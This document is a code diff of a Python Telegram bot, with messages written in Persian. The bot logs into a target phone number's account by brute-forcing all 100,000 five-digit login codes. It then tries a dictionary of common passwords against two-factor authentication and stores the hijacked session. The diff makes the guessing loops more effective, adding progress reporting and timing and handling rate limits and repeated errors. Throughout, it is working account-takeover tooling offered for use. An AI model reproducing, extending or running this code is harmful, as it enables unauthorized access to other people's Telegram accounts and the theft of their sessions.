@@ -26,7 +26,6 @@ login_sessions = {}
 
 DATA_FILE = "selfs.json"
 
-# ============ دیکشنری پسورد (بیش از 1000 پسورد رایج) ============
 PASSWORD_DICT = [
     "123456", "12345678", "123456789", "1234567890",
     "password", "pass", "admin", "admin123",
@@ -90,12 +89,10 @@ def delete_webhook():
         return False
 
 def clean_phone(text):
-    # حذف همه کاراکترهای غیرعددی
     return re.sub(r'[^0-9]', '', text)
 
 def is_valid_phone(text):
     phone = clean_phone(text)
-    # حداقل 8 رقم برای شماره‌های بین‌المللی
     return len(phone) >= 8
 
 def is_valid_api_id(text):
@@ -193,7 +190,6 @@ async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for i, self_account in enumerate(selfs):
         phone = self_account.get('phone', 'نامشخص')
         account_name = self_account.get('account_name', 'بدون نام')
-        # نمایش 4 رقم آخر شماره برای حفظ حریم خصوصی
         display_phone = phone[-4:] if len(phone) >= 4 else phone
         keyboard.append([InlineKeyboardButton(f"{i+1}. {account_name} - ***{display_phone}", callback_data=f"select_account_{i}")])
     
@@ -229,7 +225,6 @@ async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
     api_id = self_account.get('api_id')
     api_hash = self_account.get('api_hash')
     
-    # ذخیره برای مرحله بعد
     login_sessions[user_id] = {
         'index': index,
         'phone': phone,
@@ -449,7 +444,7 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_sessions[user_id]['step'] = "code"
     
     msg = await update.message.reply_text(
-        "⏳ در حال ارسال کد تایید و شروع حدس زدن...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
+        "⏳ در حال ارسال کد تایید...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
         parse_mode='HTML'
     )
     
@@ -462,11 +457,12 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client = TelegramClient(StringSession(), api_id, api_hash)
         await client.connect()
         
+        # درخواست کد
         try:
             await client.send_code_request(phone)
         except PhoneNumberInvalidError:
             await context.bot.edit_message_text(
-                f"❌ شماره تلفن نامعتبر است!\n\nشماره: <code>{phone}</code>\n\n⚠️ مطمئن شوید شماره را به درستی وارد کرده‌اید.\n<b>مثال‌ها:</b>\n• ایران: <code>989123456789</code>\n• هند: <code>919876543210</code>",
+                f"❌ شماره تلفن نامعتبر است!\n\nشماره: <code>{phone}</code>",
                 chat_id=update.effective_chat.id,
                 message_id=msg.message_id,
                 parse_mode='HTML'
@@ -508,13 +504,20 @@ async def bruteforce_password(update, context, user_id, client, msg):
         attempt = 0
         found = False
         found_password = None
+        start_time = datetime.now()
         
         await context.bot.edit_message_text(
             f"""
-🔐 <b>شروع حدس زدن پسورد 2FA...</b>
+🔐 <b>اکانت دارای رمز دو مرحله‌ای است!</b>
+
+📱 شماره: <code>{user_sessions[user_id]['phone']}</code>
+✅ کد تایید پیدا شد
+
+🔑 <b>شروع حدس زدن پسورد 2FA...</b>
 
 📊 تعداد پسوردهای دیکشنری: {total_passwords}
-⏳ در حال تلاش...
+⏳ در حال بررسی...
+🔄 پسوردهای امتحان شده: 0
 
 ⚠️ این عملیات ممکن است چند دقیقه طول بکشد.
 """,
@@ -526,15 +529,19 @@ async def bruteforce_password(update, context, user_id, client, msg):
         for password in PASSWORD_DICT:
             attempt += 1
             
-            if attempt % 100 == 0:
+            if attempt % 50 == 0:
+                elapsed = (datetime.now() - start_time).seconds
                 try:
                     await context.bot.edit_message_text(
                         f"""
 🔐 <b>در حال حدس زدن پسورد...</b>
 
+📱 شماره: <code>{user_sessions[user_id]['phone']}</code>
+
 🔑 پسورد فعلی: <code>{password}</code>
 📊 تلاش‌ها: {attempt} از {total_passwords}
 📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%
+⏱️ زمان سپری شده: {elapsed} ثانیه
 
 ⏳ لطفاً صبر کنید...
 """,
@@ -554,7 +561,7 @@ async def bruteforce_password(update, context, user_id, client, msg):
             except FloodWaitError as e:
                 wait_time = min(e.seconds, 60)
                 await context.bot.edit_message_text(
-                    f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...",
+                    f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...\nپسورد آخرین تلاش: <code>{password}</code>",
                     chat_id=update.effective_chat.id,
                     message_id=msg.message_id,
                     parse_mode='HTML'
@@ -571,23 +578,30 @@ async def bruteforce_password(update, context, user_id, client, msg):
         logger.error(f"Error in bruteforce_password: {e}")
         return False, 0, None
 
-# ============ تابع حدس زدن کد ============
+# ============ تابع حدس زدن کد (بهینه‌شده) ============
 async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg):
     try:
         total_attempts = 100000
         attempt = 0
         found = False
         code_found = None
+        start_time = datetime.now()
+        wrong_attempts = 0
+        consecutive_errors = 0
         
         await context.bot.edit_message_text(
             f"""
 🔍 <b>شروع حدس زدن کد تایید...</b>
 
 📱 شماره: <code>{phone}</code>
-🔢 محدوده: 00000 تا 99999
-📊 مجموع تلاش‌ها: {total_attempts}
 
-⏳ در حال تلاش...
+🔢 محدوده کدها: 00000 تا 99999
+📊 مجموع کدهای ممکن: {total_attempts}
+⏳ در حال حدس زدن...
+🔄 کدهای امتحان شده: 0
+❌ کدهای اشتباه: 0
+
+⏳ لطفاً صبر کنید...
 """,
             chat_id=update.effective_chat.id,
             message_id=msg.message_id,
@@ -598,7 +612,11 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
             code = str(code_num).zfill(5)
             attempt += 1
             
-            if attempt % 1000 == 0:
+            # هر 500 تلاش یا هر 3 ثانیه یکبار پیام رو بروزرسانی کن
+            if attempt % 500 == 0:
+                elapsed = (datetime.now() - start_time).seconds
+                percent = (attempt / total_attempts) * 100
+                remaining = int(((total_attempts - attempt) / max(attempt, 1)) * max(elapsed, 1)) if attempt > 0 else 0
                 try:
                     await context.bot.edit_message_text(
                         f"""
@@ -606,8 +624,13 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
 
 📱 شماره: <code>{phone}</code>
 🔢 کد فعلی: <code>{code}</code>
-📊 تلاش‌ها: {attempt} از {total_attempts}
-📈 پیشرفت: {(attempt/total_attempts)*100:.1f}%
+
+📊 <b>آمار:</b>
+• تلاش‌ها: {attempt} از {total_attempts}
+• پیشرفت: {percent:.2f}%
+• زمان سپری شده: {elapsed} ثانیه
+• کدهای اشتباه: {wrong_attempts}
+• زمان تخمینی باقی‌مانده: {remaining} ثانیه
 
 ⏳ لطفاً صبر کنید...
 """,
@@ -625,12 +648,23 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                 break
                 
             except PhoneCodeInvalidError:
+                wrong_attempts += 1
+                consecutive_errors = 0
                 continue
                 
             except FloodWaitError as e:
                 wait_time = min(e.seconds, 60)
                 await context.bot.edit_message_text(
-                    f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...\nکد آخرین تلاش: <code>{code}</code>",
+                    f"""
+⏳ <b>محدودیت تلگرام!</b>
+
+📱 شماره: <code>{phone}</code>
+⏳ {wait_time} ثانیه صبر کنید...
+🔢 کد آخرین تلاش: <code>{code}</code>
+📊 تلاش‌ها: {attempt} از {total_attempts}
+
+⏳ لطفاً صبر کنید...
+""",
                     chat_id=update.effective_chat.id,
                     message_id=msg.message_id,
                     parse_mode='HTML'
@@ -645,6 +679,8 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
 
 📱 شماره: <code>{phone}</code>
 ✅ کد تایید پیدا شد: <code>{code}</code>
+📊 تلاش‌های کد: {attempt}
+❌ کدهای اشتباه: {wrong_attempts}
 
 🔑 در حال حدس زدن پسورد 2FA...
 ⏳ لطفاً صبر کنید...
@@ -702,10 +738,13 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
 
 📱 شماره: <code>{phone}</code>
 👤 نام اکانت: <b>{account_name}</b>
-🔑 کد پیدا شده: <code>{code}</code>
-🔐 پسورد پیدا شده: <code>{pass_found}</code>
-📊 تلاش‌های کد: {attempt}
-📊 تلاش‌های پسورد: {pass_attempt}
+
+🔑 <b>جزئیات حدس‌زنی:</b>
+• کد پیدا شده: <code>{code}</code>
+• تلاش‌های کد: {attempt}
+• کدهای اشتباه: {wrong_attempts}
+• پسورد پیدا شده: <code>{pass_found}</code>
+• تلاش‌های پسورد: {pass_attempt}
 
 🎯 سلف به لیست شما اضافه شد.
 """
@@ -746,6 +785,16 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
                 
             except Exception as e:
                 logger.error(f"Error in bruteforce: {e}")
+                consecutive_errors += 1
+                if consecutive_errors > 10:
+                    await context.bot.edit_message_text(
+                        f"❌ خطاهای متوالی زیاد! ممکن است شماره تلفن یا API اطلاعات نادرست باشد.\n{str(e)[:200]}",
+                        chat_id=update.effective_chat.id,
+                        message_id=msg.message_id,
+                        parse_mode='HTML'
+                    )
+                    await clear_user_session(user_id)
+                    return
                 continue
         
         if found and code_found:
@@ -787,13 +836,18 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
             
             await clear_user_session(user_id)
             
+            elapsed = (datetime.now() - start_time).seconds
             text = f"""
 ✅ <b>سلف با موفقیت ساخته شد!</b>
 
 📱 شماره: <code>{phone}</code>
 👤 نام اکانت: <b>{account_name}</b>
-🔑 کد پیدا شده: <code>{code_found}</code>
-📊 تعداد تلاش‌ها: {attempt}
+
+🔑 <b>جزئیات حدس‌زنی:</b>
+• کد پیدا شده: <code>{code_found}</code>
+• کل تلاش‌ها: {attempt}
+• کدهای اشتباه: {wrong_attempts}
+• زمان سپری شده: {elapsed} ثانیه
 
 🎯 سلف به لیست شما اضافه شد.
 """
@@ -813,12 +867,17 @@ async def bruteforce_code(update, context, user_id, phone, api_id, api_hash, cli
             )
             
         else:
+            elapsed = (datetime.now() - start_time).seconds
             await context.bot.edit_message_text(
                 f"""
 ❌ <b>کد تایید پیدا نشد!</b>
 
 📱 شماره: <code>{phone}</code>
-📊 تعداد تلاش‌ها: {attempt}
+
+📊 <b>آمار تلاش‌ها:</b>
+• کل تلاش‌ها: {attempt}
+• کدهای اشتباه: {wrong_attempts}
+• زمان سپری شده: {elapsed} ثانیه
 
 ممکن است:
 • شماره تلفن اشتباه باشد
